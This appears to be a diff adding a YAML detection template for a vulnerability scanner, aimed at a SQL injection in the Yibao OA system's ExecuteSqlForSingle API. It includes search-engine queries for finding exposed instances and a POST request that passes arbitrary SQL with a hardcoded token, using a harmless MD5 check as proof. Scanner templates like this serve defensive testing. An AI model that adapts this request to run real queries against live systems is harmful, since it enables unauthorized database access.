@@ -1,0 +1,26 @@
+id: yibao-oa-executesqlforsingle-sqli
+
+info:
+  name: 易宝OA系统ExecuteSqlForSingle接口存在SQL注入
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    易宝OA系统ExecuteSqlForSingle接口存在SQL注入漏洞。
+    Fofa: product="顶讯科技-易宝OA系统"
+    ZoomEye: app:"易宝 OA"
+  reference:
+    - https://mp.weixin.qq.com/s/7hBPV2vYN_FE-qHKrdujSA
+  tags: yibao,sqli
+  created: 2023/11/28
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /api/system/ExecuteSqlForSingle
+      body: |
+        token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','afrogtest')),3,32)&strParameters
+    expression: response.status == 200 && response.body.bcontains(b'35198e078740db47f61ed2b2fd7618fa')
+expression: r0()
+    
